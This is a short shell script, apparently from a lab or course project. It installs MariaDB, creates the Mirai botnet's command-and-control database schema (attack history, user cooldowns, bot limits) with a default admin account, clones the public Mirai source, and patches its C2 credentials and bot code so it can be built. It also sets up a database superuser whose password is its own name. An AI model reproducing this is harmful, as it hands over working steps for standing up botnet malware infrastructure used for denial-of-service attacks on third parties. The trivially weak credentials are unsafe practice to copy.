set -x

sudo apt update -y
sudo apt install -y git\
		    build-essential\
		    golang-go\
		    mariadb-server\
		    mariadb-client

cat << END > /tmp/db.sql
CREATE OR REPLACE USER asodb@localhost IDENTIFIED BY 'asodb';
GRANT ALL ON *.* TO asodb@localhost IDENTIFIED BY 'asodb' WITH GRANT OPTION;
FLUSH PRIVILEGES;

CREATE OR REPLACE DATABASE mirai;
USE mirai;

CREATE TABLE \`history\` (
  \`id\` int(10) unsigned NOT NULL AUTO_INCREMENT,
  \`user_id\` int(10) unsigned NOT NULL,
  \`time_sent\` int(10) unsigned NOT NULL,
  \`duration\` int(10) unsigned NOT NULL,
  \`command\` text NOT NULL,
  \`max_bots\` int(11) DEFAULT '-1',
  PRIMARY KEY (\`id\`),
  KEY \`user_id\` (\`user_id\`)
);

CREATE TABLE \`users\` (
  \`id\` int(10) unsigned NOT NULL AUTO_INCREMENT,
  \`username\` varchar(32) NOT NULL,
  \`password\` varchar(32) NOT NULL,
  \`duration_limit\` int(10) unsigned DEFAULT NULL,
  \`cooldown\` int(10) unsigned NOT NULL,
  \`wrc\` int(10) unsigned DEFAULT NULL,
  \`last_paid\` int(10) unsigned NOT NULL,
  \`max_bots\` int(11) DEFAULT '-1',
  \`admin\` int(10) unsigned DEFAULT '0',
  \`intvl\` int(10) unsigned DEFAULT '30',
  \`api_key\` text,
  PRIMARY KEY (\`id\`),
  KEY \`username\` (\`username\`)
);

CREATE TABLE \`whitelist\` (
  \`id\` int(10) unsigned NOT NULL AUTO_INCREMENT,
  \`prefix\` varchar(16) DEFAULT NULL,
  \`netmask\` tinyint(3) unsigned DEFAULT NULL,
  PRIMARY KEY (\`id\`),
  KEY \`prefix\` (\`prefix\`)
);

INSERT INTO users VALUES (NULL, 'aso', 'aso', 0, 0, 0, 0, -1, 1, 30, '');
END

sudo systemctl enable mariadb
sudo mysql < /tmp/db.sql
rm /tmp/db.sql

git clone https://github.com/jgamblin/Mirai-Source-Code.git
pushd Mirai-Source-Code/mirai

go mod init aso/project
go mod tidy

sed -i 's/root/asodb/' cnc/main.go
sed -i 's/password/asodb/' cnc/main.go

sed -i 's/ipv4_t LOCAL_ADDR;/extern &/' bot/includes.h
sed -i 's/struct sockaddr_in srv_addr;/ipv4_t LOCAL_ADDR;\n&/' bot/main.c

#./build.sh debug telnet
#./build.sh debug telnet

cp prompt.txt debug/

popd

